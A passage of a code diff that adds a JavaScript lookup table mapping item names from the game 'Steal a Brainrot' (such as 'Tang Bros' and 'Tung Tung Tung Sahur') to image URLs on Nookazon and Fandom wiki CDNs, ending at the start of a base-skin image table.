+  "Tang Bros": "https://static.wikia.nocookie.net/stealabr/images/1/12/Tang_Bros.png/revision/latest?cb=20261114201345",
+  "Capitano Moby": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Capitano_Moby.png",
+  "Orchidox": "https://cdn.nookazon.com/128x128/stealabrainrot/items/ae13290a9093afeb.png",
+  "Cooki and Milki": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Cooki_and_Milki.png",
+  "Arcadragon": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Arcadragon.png",
+  "Burguro and Fryuro": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Burguro_And_Fryuro.png",
+  "Los Secret Combinasionas": "https://cdn.nookazon.com/128x128/stealabrainrot/items/7e8420220a3c0b37.png",
+  "Ketupat Bros": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Ketupat_Bros.png",
+  "Reinito Sleighito": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Reinito_Sleighito.png",
+  "Fortunu and Cashuru": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Fortunu_and_Cashuru.png",
+  "Pizza and Ranch": "https://cdn.nookazon.com/128x128/stealabrainrot/items/4d02123871662bf9.png",
+  "Los Amigos": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Amigos.png",
+  "Pancake and Syrup": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Pancake_and_Syrup.png",
+  "Foxini Lanternini": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Foxini_Lanternini.png",
+  "Popcuru and Fizzuru": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Popcuru_and_Fizzuru.png",
+  "Los Sekolahs": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Sekolahs.png",
+  "Sammyni Truckini": "https://cdn.nookazon.com/128x128/stealabrainrot/items/94b5c526d0b06c57.png",
+  "Signore Carapace": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Signore_Carapace.png",
+  "La Casa Boo": "https://cdn.nookazon.com/128x128/stealabrainrot/items/La_Casa_Boo.png",
+  "Cash or Card": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Cash_or_Card.png",
+  "Fragrama and Chocrama": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Fragrama_and_Chocrama.png",
+  "Los Admins": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Admins.png",
+  "La Secret Combinasion": "https://cdn.nookazon.com/128x128/stealabrainrot/items/La_Secret_Combinasion.png",
+  "La Fuse Machine": "https://cdn.nookazon.com/128x128/stealabrainrot/items/2202fc4c253bf117.png",
+  "Duggy Bros": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Duggy_Bros.png",
+  "La Food Combinasion": "https://cdn.nookazon.com/128x128/stealabrainrot/items/La_Food_Combinasion.png",
+  "Yetimatic": "https://cdn.nookazon.com/128x128/stealabrainrot/items/599989ef018bcdf9.png",
+  "Gold and Diamond": "https://static.wikia.nocookie.net/stealabr/images/2/26/Gold_and_Diamond.png/revision/latest?cb=20260912202921",
+  "Elefanto Frigo": "https://static.wikia.nocookie.net/stealabr/images/4/4b/Elefanto_Frigo.png/revision/latest?cb=20260417150142",
+  "Sammyni Cakini": "https://static.wikia.nocookie.net/stealabr/images/1/1f/Sammyni_Cakini.png/revision/latest?cb=20260524140721",
+  "S'more Serat": "https://static.wikia.nocookie.net/stealabr/images/9/96/S%27more_Serat.png/revision/latest?cb=20260809132345",
+  "Tirilikalika Tirilikalako": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Tirilikalika_Tirilikalako.png",
+  "Boppin Bunny": "https://static.wikia.nocookie.net/stealabr/images/b/bc/Boppin_Bunny.png/revision/latest/scale-to-width-down/1000?cb=20260405151129",
+  "Spooky and Pumpky": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Spooky_and_Pumpky.png",
+  "Sammyni Spookyni": "https://static.wikia.nocookie.net/stealabr/images/0/0f/Sammyni_Spookyni.png/revision/latest?cb=20261003201949",
+  "Cangurato Gelato": "https://cdn.nookazon.com/128x128/stealabrainrot/items/445c3372982a7d13.png",
+  "La Craft Machine": "https://cdn.nookazon.com/128x128/stealabrainrot/items/459b46d7dbb2d09a.png",
+  "Los Hackers": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Hackers.png",
+  "Ginger Gerat": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Ginger_Gerat.png",
+  "La Ginger Sekolah": "https://cdn.nookazon.com/128x128/stealabrainrot/items/La_Ginger_Sekolah.png",
+  "Capitano Americano": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Capitano_Americano.png",
+  "Bearito Cabinito": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Bearito_Cabinito.png",
+  "Rubiko and Kubiko": "https://cdn.nookazon.com/128x128/stealabrainrot/items/4dd2a9ced3027bf3.png",
+  "Rubrikiko": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Rubrikiko.png",
+  "Examen Bros": "https://cdn.nookazon.com/128x128/stealabrainrot/items/73c391629ccfce1b.png",
+  "Los Spaghettis": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Spaghettis.png",
+  "Sammyni Fattini": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Sammyni_Fattini.png",
+  "Gorillo Subwoofero": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Gorillo_Subwoofero.png",
+  "Festive 67": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Festive_67.png",
+  "Panda Popanda": "https://cdn.nookazon.com/128x128/stealabrainrot/items/3cdc2e6619f1343d.png",
+  "Queen Bee": "https://cdn.nookazon.com/128x128/stealabrainrot/items/87646f57b1a4198e.png",
+  "Quackini Snackini": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Quackini_Snackini.png",
+  "Ventoliero Pavonero": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Ventoliero_Pavonero.png",
+  "Grabatron": "https://cdn.nookazon.com/128x128/stealabrainrot/items/71662ec3e845cd9b.png",
+  "Los Tictacs": "https://cdn.nookazon.com/128x128/stealabrainrot/items/16ac87ec519580d2.png",
+  "Cloverat Clapat": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Cloverat_Clapat.png",
+  "Spaghetti Tualetti": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Spaghetti_Tualetti.png",
+  "Candini Fluffini": "https://cdn.nookazon.com/128x128/stealabrainrot/items/740a6f44eb27bd38.png",
+  "Antonio": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Antonio.png",
+  "Steakini Fattini": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Steakini_Fattini.png",
+  "Caylusaurus": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Caylusaurus.png",
+  "Hopilikalika Hopilikalako": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Hopilikalika_Hopilikalako.png",
+  "La Easter Grande": "https://cdn.nookazon.com/128x128/stealabrainrot/items/La_Easter_Grande.png",
+  "Polaroidini": "https://cdn.nookazon.com/128x128/stealabrainrot/items/ae6652cde0496471.png",
+  "Garama and Madundung": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Garama_and_Madundung.png",
+  "Nacho Spyder": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Nacho_Spyder.png",
+  "Rosetti Tualetti": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Rosetti_Tualetti.png",
+  "Scorpino Coasterino": "https://cdn.nookazon.com/128x128/stealabrainrot/items/f5292acdf887ef5d.png",
+  "Nachorilla": "https://cdn.nookazon.com/128x128/stealabrainrot/items/d3ac869837d546f4.png",
+  "Chicli Chicla": "https://cdn.nookazon.com/128x128/stealabrainrot/items/eea64ccfc792935c.png",
+  "Fishino Clownino": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Fishino_Clownino.png",
+  "Money Money Bros": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Money_Money_Bros.png",
+  "Gold Gold Gold": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Gold_Gold_Gold.png",
+  "Jolly Jolly Sahur": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Jolly_Jolly_Sahur.png",
+  "Lavadorito Spinito": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Lavadorito_Spinito.png",
+  "Rico Dinero": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Rico_Dinero.png",
+  "Los Tangcitos": "https://cdn.nookazon.com/128x128/stealabrainrot/items/6d49ecb93067e3a3.png",
+  "Ketchuru and Musturu": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Ketchuru_and_Musturu.png",
+  "La Lucky Grande": "https://cdn.nookazon.com/128x128/stealabrainrot/items/La_Lucky_Grande.png",
+  "La Romantic Grande": "https://cdn.nookazon.com/128x128/stealabrainrot/items/La_Romantic_Grande.png",
+  "Orcaledon": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Orcaledon.png",
+  "Swaggy Bros": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Swaggy_Bros.png",
+  "Tictac Sahur": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Tictac_Sahur.png",
+  "Dug Dug Dug": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Dug_dug_dug.png",
+  "Ketupat Kepat": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Ketupat_Kepat.png",
+  "La Taco Combinasion": "https://cdn.nookazon.com/128x128/stealabrainrot/items/La_Taco_Combinasion.png",
+  "Coco and Mango": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Coco_and_Mango.png",
+  "Tang Tang Keletang": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Tang_Tang_Keletang.png",
+  "Lovin Rose": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Lovin_Rose.png",
+  "Noo My Examine": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Noo_my_examine.png",
+  "Bufalino Boomberino": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Bufalino_Boomberino.png",
+  "Honey Honey Bear": "https://cdn.nookazon.com/128x128/stealabrainrot/items/0c87ddb5ef14a7c8.png",
+  "Los Tacoritas": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Tacoritas.png",
+  "Eviledon": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Eviledon.png",
+  "Los Primos": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Primos.png",
+  "Esok Sekolah": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Esok_Sekolah.png",
+  "La Jolly Grande": "https://cdn.nookazon.com/128x128/stealabrainrot/items/La_Jolly_Grande.png",
+  "Los Cupids": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Cupids.png",
+  "Los Puggies": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Puggies.png",
+  "W or L": "https://cdn.nookazon.com/128x128/stealabrainrot/items/W_or_L.png",
+  "Globa Steppa": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Globa_Steppa.png",
+  "Gobblino Uniciclino": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Gobblino_Uniciclino.png",
+  "Tralaledon": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Tralaledon.png",
+  "Noodle Noodle Poodle": "https://cdn.nookazon.com/128x128/stealabrainrot/items/a1ace725a1b606c2.png",
+  "Mieteteira Bicicleteira": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Mieteteira_Bicicleteira.png",
+  "Pop Pop Petalini": "https://static.wikia.nocookie.net/stealabr/images/d/d6/Pop_Pop_Petalini.png/revision/latest?cb=20260904192642",
+  "Tuff Toucan": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Tuff_Toucan.png",
+  "Tacoturbo Tacorito": "https://cdn.nookazon.com/128x128/stealabrainrot/items/15c0d291d56fb261.png",
+  "Chillin Chili": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Chillin_Chili.png",
+  "Chipso and Queso": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Chipso_and_Queso.png",
+  "Money Money Reindeer": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Money_Money_Reindeer.png",
+  "La Spooky Grande": "https://static.wikia.nocookie.net/stealabr/images/0/0a/La_Spooky_Grande.png/revision/latest?cb=20251012022949",
+  "La Extinct Grande": "https://static.wikia.nocookie.net/stealabr/images/c/cd/La_Extinct_Grande.png/revision/latest?cb=20260328010322",
+  "Los Candies": "https://static.wikia.nocookie.net/stealabr/images/2/2a/Los_Candies.png/revision/latest?cb=20260722214707",
+  "Celularcini Viciosini": "https://static.wikia.nocookie.net/stealabr/images/a/a2/Celularcini_Viciosini.png/revision/latest?cb=20260805124357",
+  "Churrito Bunnito": "https://static.wikia.nocookie.net/stealabr/images/0/05/Churrito_Bunnito.png/revision/latest?cb=20260405145418",
+  "Money Money Puggy": "https://static.wikia.nocookie.net/stealabr/images/d/d6/Money_Money_Puggy.png/revision/latest?cb=20260217180308",
+  "Cigno Fulgoro": "https://static.wikia.nocookie.net/stealabr/images/f/f7/Cigno_Fulgoro.png/revision/latest?cb=20260417152643",
+  "Los Hotspotsitos": "https://static.wikia.nocookie.net/stealabr/images/6/69/Loshotspotsitos.png/revision/latest?cb=20251226204212",
+  "Los Jolly Combinasionas": "https://static.wikia.nocookie.net/stealabr/images/7/7b/Los_jollycombos.png/revision/latest?cb=20251227115909",
+  "Los Spooky Combinasionas": "https://static.wikia.nocookie.net/stealabr/images/8/88/Los_Spooky_Combinasionas.png/revision/latest?cb=20251030015823",
+  "Chicleteira Champeona": "https://static.wikia.nocookie.net/stealabr/images/0/0e/Chicleteira_Champeona.png/revision/latest?cb=20260725204825",
+  "Los Planitos": "https://static.wikia.nocookie.net/stealabr/images/8/83/Los_Planitos.png/revision/latest?cb=20260605183247",
+  "Snailo Clovero": "https://static.wikia.nocookie.net/stealabr/images/a/ae/Snailo_Clovero.png/revision/latest?cb=20260428170051",
+  "Deputy Leopard": "https://static.wikia.nocookie.net/stealabr/images/9/95/Deputy_Leopard.png/revision/latest?cb=20260916012046",
+  "Chicleteira Cupideira": "https://static.wikia.nocookie.net/stealabr/images/6/6f/Chicleteira_Cupideira.png/revision/latest?cb=20260328033104",
+  "DJ Panda": "https://static.wikia.nocookie.net/stealabr/images/3/38/DJ_Panda.png/revision/latest?cb=20260922021234",
+  "Las Sis": "https://static.wikia.nocookie.net/stealabr/images/e/e8/Las_Sis.png/revision/latest?cb=20260417151204",
+  "Spinny Hammy": "https://static.wikia.nocookie.net/stealabr/images/c/cb/Spinny_Hammy.png/revision/latest?cb=20260428165949",
+  "Los Sweethearts": "https://static.wikia.nocookie.net/stealabr/images/a/a3/Los_Sweethearts.png/revision/latest?cb=20260327201824",
+  "Tacorita Bicicleta": "https://static.wikia.nocookie.net/stealabr/images/9/9d/Tacorita_Bicicleta.png/revision/latest?cb=20260328161713",
+  "Bacuru and Egguru": "https://static.wikia.nocookie.net/stealabr/images/b/b5/Bacuru_and_Egguru.png/revision/latest?cb=20260417154056",
+  "Cola Cat": "https://static.wikia.nocookie.net/stealabr/images/2/2e/Cola_Cat.png/revision/latest?cb=20260928223602",
+  "Baskito": "https://static.wikia.nocookie.net/stealabr/images/e/e6/Baskito.png/revision/latest?cb=20260625234705",
+  "Bananito": "https://static.wikia.nocookie.net/stealabr/images/7/7e/Bananito.png/revision/latest?cb=20260417152109",
+  "Chicleteira Noelteira": "https://static.wikia.nocookie.net/stealabr/images/6/65/Default_Chicleteira_Noelteira.png/revision/latest?cb=20260709225557",
+  "Los Combinasionas": "https://static.wikia.nocookie.net/stealabr/images/f/f6/Los_Combinasionas.png/revision/latest?cb=20260917213000",
+  "Nuclearo Dinossauro": "https://static.wikia.nocookie.net/stealabr/images/b/b5/Nuclearo_Dinossauro.png/revision/latest?cb=20260328003025",
+  "Chimnino": "https://static.wikia.nocookie.net/stealabr/images/c/c5/Chimnino.png/revision/latest?cb=20260703171415",
+  "Los 67": "https://static.wikia.nocookie.net/stealabr/images/c/c1/Los_67.png/revision/latest?cb=20260602123429",
+  "Noo My Gold": "https://static.wikia.nocookie.net/stealabr/images/f/fa/Noo_my_Gold.png/revision/latest?cb=20260428165851",
+  "Noo My Heart": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Noo_my_Heart.png",
+  "Swag Soda": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Swag_Soda.png",
+  "Pogo Pogo Penguin": "https://cdn.nookazon.com/128x128/stealabrainrot/items/40027272ea23e302.png",
+  "Mariachi Corazoni": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Mariachi_Corazoni.png",
+  "Tacorillo Crocodillo": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Tacorillo_Crocodillo.png",
+  "La Grande Combinasion": "https://cdn.nookazon.com/128x128/stealabrainrot/items/La_Grande_Combinasion.png",
+  "Los 25": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_25.png",
+  "Conetto Morsetto": "https://cdn.nookazon.com/128x128/stealabrainrot/items/18a3e6845be238e7.png",
+  "Los Burritos": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Burritos.png",
+  "Los Mobilis": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Mobilis.png",
+  "John Doe": "https://cdn.nookazon.com/128x128/stealabrainrot/items/John_Doe.png",
+  "67": "https://cdn.nookazon.com/128x128/stealabrainrot/items/67.png",
+  "Donkeyturbo Express": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Donkeyturbo_Express.png",
+  "Los Chicleteiras": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Chicleteiras.png",
+  "Noo My Eggs": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Noo_my_Eggs.png",
+  "Burrito Bat": "https://cdn.nookazon.com/128x128/stealabrainrot/items/18820a5c71a6b26f.png",
+  "Guest 666": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Guest_666.png",
+  "Los Mi Gatitos": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Mi_Gatitos.png",
+  "Strawberrita": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Strawberrita.png",
+  "Noo My Present": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Noo_my_Present.png",
+  "Rang Ring Bus": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Rang_Ring_Bus.png",
+  "Los Nooo My Hotspotsitos": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Nooo_My_Hotspotsitos.png",
+  "Serafinna Medusella": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Serafinna_Medusella.png",
+  "Arcadopus": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Arcadopus.png",
+  "Noo My Candy": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Noo_my_Candy.png",
+  "Los Quesadillas": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Quesadillas.png",
+  "Los Bunitos": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Bunitos.png",
+  "Burrito Bandito": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Burrito_Bandito.png",
+  "Chicleteirina Bicicleteirina": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Chicleteirina_Bicicleteirina.png",
+  "Chill Puppy": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Chill_Puppy.png",
+  "Granny": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Granny.png",
+  "4th Bros": "https://cdn.nookazon.com/128x128/stealabrainrot/items/4th_Bros.png",
+  "Luck Luck Luck Sahur": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Luck_Luck_Luck_Sahur.png",
+  "Brunito Marsito": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Brunito_Marsito.png",
+  "Chicleteira Bicicleteira": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Chicleteira_Bicicleteira.png",
+  "Cupid Hotspot": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Cupid_Hotspot.png",
+  "Eid Eid Eid Sahur": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Eid_Eid_Eid_Sahur.png",
+  "Quesadillo Vampiro": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Quesadillo_Vampiro.png",
+  "Mi Gatito": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Mi_Gatito.png",
+  "Ho Ho Ho Sahur": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Ho_Ho_Ho_Sahur.png",
+  "Cupid Cupid Sahur": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Cupid_Cupid_Sahur.png",
+  "Bunito Bunito Spinito": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Bunito_Bunito_Spinito.png",
+  "Naughty Naughty": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Naughty_Naughty.png",
+  "Pot Pumpkin": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Pot_Pumpkin.png",
+  "Quesadilla Crocodila": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Quesadilla_Crocodila.png",
+  "Horegini Boom": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Horegini_Boom.png",
+  "Santa Hotspot": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Santa_Hotspot.png",
+  "25": "https://cdn.nookazon.com/128x128/stealabrainrot/items/25.png",
+  "Pirulitoita Bicicleteira": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Pirulitoita_Bicicleteira.png",
+  "Pot Hotspot": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Pot_Hotspot.png",
+  "Bunny Bunny Bunny Sahur": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Bunny_Bunny_Bunny_Sahur.png",
+  "To To To Sahur": "https://cdn.nookazon.com/128x128/stealabrainrot/items/To_to_to_Sahur.png",
+  "La Sahur Combinasion": "https://cdn.nookazon.com/128x128/stealabrainrot/items/La_Sahur_Combinasion.png",
+  "List List List Sahur": "https://cdn.nookazon.com/128x128/stealabrainrot/items/List_List_List_Sahur.png",
+  "Telemorte": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Telemorte.png",
+  "Berryno": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Berryno.png",
+  "Bunnyman": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Bunnyman.png",
+  "Los Jobcitos": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Jobcitos.png",
+  "Nooo My Hotspot": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Nooo_My_Hotspot.png",
+  "Tung Tung Tung Sahur": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Tung_Tung_Tung_Sahur.png",
+  "Cuadramat and Pakrahmatmamat": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Cuadramat_and_Pakrahmatmamat.png",
+  "Please My Present": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Please_my_Present.png",
+  "Easter Easter Easter Sahur": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Easter_Easter_Easter_Sahur.png",
+  "Los Cucarachas": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Cucarachas.png",
+  "1x1x1x1": "https://cdn.nookazon.com/128x128/stealabrainrot/items/1x1x1x1.png",
+  "La Vacca Lepre Lepreino": "https://cdn.nookazon.com/128x128/stealabrainrot/items/La_Vacca_Lepre_Lepreino.png",
+  "Graipuss Medussi": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Graipuss_Medussi.png",
+  "Love Love Love Sahur": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Love_Love_Love_Sahur.png",
+  "Perrito Burrito": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Perrito_Burrito.png",
+  "Giftini Spyderini": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Giftini_Spyderini.png",
+  "GOAT": "https://cdn.nookazon.com/128x128/stealabrainrot/items/GOAT.png",
+  "Paradiso Axolottino": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Paradiso_Axolottino.png",
+  "Trickolino": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Trickolino.png",
+  "Triplito Tralaleritos": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Triplito_Tralaleritos.png",
+  "Buntteo": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Buntteo.png",
+  "La Vacca Jacko Linterino": "https://cdn.nookazon.com/128x128/stealabrainrot/items/La_Vacca_Jacko_Linterino.png",
+  "Fishboard": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Fishboard.png",
+  "Santteo": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Santteo.png",
+  "Las Vaquitas Saturnitas": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Las_Vaquitas_Saturnitas.png",
+  "Los Karkeritos": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Karkeritos.png",
+  "Karker Sahur": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Karker_Sahur.png",
+  "Frankentteo": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Frankentteo.png",
+  "Job Job Job Sahur": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Job_Job_Job_Sahur.png",
+  "Los Trios": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Trios.png",
+  "Las Tralaleritas": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Las_Tralaleritas.png",
+  "Pumpkini Spyderini": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Pumpkini_Spyderini.png",
+  "Rocco Disco": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Rocco_Disco.png",
+  "Extinct Matteo": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Extinct_Matteo.png",
+  "La Karkerkar Combinasion": "https://cdn.nookazon.com/128x128/stealabrainrot/items/La_Karkerkar_Combinasion.png",
+  "La Vacca Prese Presente": "https://cdn.nookazon.com/128x128/stealabrainrot/items/La_Vacca_Prese_Presente.png",
+  "Reindeer Tralala": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Reindeer_Tralala.png",
+  "Yess My Examine": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Yess_my_examine.png",
+  "Guerriro Digitale": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Guerriro_Digitale.png",
+  "Boatito Auratito": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Boatito_Auratito.png",
+  "Los Tortus": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Tortus.png",
+  "Los Tralaleritos": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Tralaleritos.png",
+  "Vulturino Skeletono": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Vulturino_Skeletono.png",
+  "Zombie Tralala": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Zombie_Tralala.png",
+  "La Cucaracha": "https://cdn.nookazon.com/128x128/stealabrainrot/items/La_Cucaracha.png",
+  "Extinct Tralalero": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Extinct_Tralalero.png",
+  "Fragola La La La": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Fragola_La_La_La.png",
+  "Agarrini la Palini": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Agarrini_la_Palini.png",
+  "Los Spyderinis": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Spyderinis.png",
+  "Blackhole GOAT": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Blackhole_Goat.png",
+  "Chachechi": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Chachechi.png",
+  "Dul Dul Dul": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Dul_Dul_Dul.png",
+  "Torrtuginni Dragonfrutini": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Torrtuginni_Dragonfrutini.png",
+  "Trenostruzzo Turbo 4000": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Trenostruzzo_Turbo_4000.png",
+  "Bisonte Giuppitere": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Bisonte_Giuppitere.png",
+  "Karkerkar Kurkur": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Karkerkar_Kurkur.png",
+  "La Vacca Saturno Saturnita": "https://cdn.nookazon.com/128x128/stealabrainrot/items/La_Vacca_Saturno_Saturnita.png",
+  "Los Matteos": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Los_Matteos.png",
+  "Sammyni Spyderini": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Sammyni_Spyderini.png",
+  "Jackorilla": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Jackorilla.png",
+  "Ginger Cisterna": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Ginger_Cisterna.png",
+  "Centrucci Nuclucci": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Centrucci_Nuclucci.png",
+  "Rhino Helicopterino": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Rhino_Helicopterino.png",
+  "Secret Lucky Block": "https://cdn.nookazon.com/128x128/stealabrainrot/items/Secret_Lucky_Block.png"
+}
+const BASE_IMAGES = {
+  "Aquatic": "https://cdn.nookazon.com/stealabrainrot/items/cecc2fd151d1c943.png",
+  "Bee Emperor": "https://cdn.nookazon.com/128x128/stealabrainrot/items/7b70cce8e1beadcf.png",
+  "Bunny Basket": "https://cdn.nookazon.com/128x128/stealabrainrot/items/8468d37eb233c6ff.png",
+  "Candy": "https://static.wikia.nocookie.net/stealabr/images/1/1d/Candy_Base_Skin_Icon.png/revision/latest/scale-to-width-down/180?cb=20260720040019",
+  "Christmas": "https://cdn.nookazon.com/128x128/stealabrainrot/items/d72beb1ba27c114e.png",
+  "Cursed": "https://static.wikia.nocookie.net/stealabr/images/7/77/Cursed_Base_Skin_Icon.png/revision/latest/scale-to-width-down/204?cb=20260720040020",
